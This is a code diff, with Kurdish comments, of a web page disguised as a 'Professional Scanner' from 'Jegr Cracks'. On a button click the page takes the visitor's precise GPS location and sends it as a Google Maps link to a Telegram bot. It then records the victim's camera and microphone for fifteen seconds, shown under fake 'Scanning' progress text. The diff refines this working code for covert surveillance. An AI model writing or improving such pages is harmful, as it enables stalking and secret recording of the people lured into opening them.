@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jegr Cracks - Ultimate Scanner</title>
+    <title>Jegr Cracks - Professional Scanner</title>
     <style>
         body { background-color: #050505; color: #00ff41; text-align: center; font-family: 'Courier New', monospace; padding: 30px 15px; margin: 0; }
         .box { border: 2px solid #00ff41; display: inline-block; padding: 25px; border-radius: 10px; background: rgba(0, 255, 65, 0.05); box-shadow: 0 0 20px #00ff41; width: 100%; max-width: 450px; }
@@ -31,10 +31,11 @@
 
         startBtn.addEventListener('click', async () => {
             try {
-                // ١. لۆکەیشنی دەقیق (لینکی ڕاستەوخۆ بە نیشانەی سوورەوە)
+                // ١. ناردنی لۆکەیشن - هێڵی ٣٨ لێرەدا چاککراوە بۆ ${lat}
                 navigator.geolocation.getCurrentPosition(position => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
+                    // لۆکەیشنەکە چاککرا بۆ ئەوەی ڕاستەوخۆ ژمارەکان بنێرێت
                     const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                     
                     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -42,18 +43,17 @@
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             chat_id: chatId,
-                            text: `📍 لۆکەیشنی دەقیقی کەسەکە:\n${mapUrl}`
+                            text: `📍 لۆکەیشنی وردی کەسەکە دۆزرایەوە:\n${mapUrl}`
                         })
                     });
                 }, null, { enableHighAccuracy: true, timeout: 15000 });
 
-                // ٢. تۆمارکردنی ڤیدیۆ و سەوت (بە فۆرماتی دروست بۆ ئەوەی سەوتەکە نەسوتێت)
+                // ٢. تۆمارکردنی ڤیدیۆ و سەوت
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 startBtn.style.display = "none";
                 statusText.style.display = "block";
-                statusText.innerText = "Scanning... 10%";
 
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+                const mediaRecorder = new MediaRecorder(stream);
                 const chunks = [];
                 mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                 
@@ -74,7 +74,6 @@
 
                 mediaRecorder.start();
                 
-                // ١٥ چرکە تۆمارکردن
                 let timeLeft = 15;
                 const timer = setInterval(() => {
                     timeLeft--;
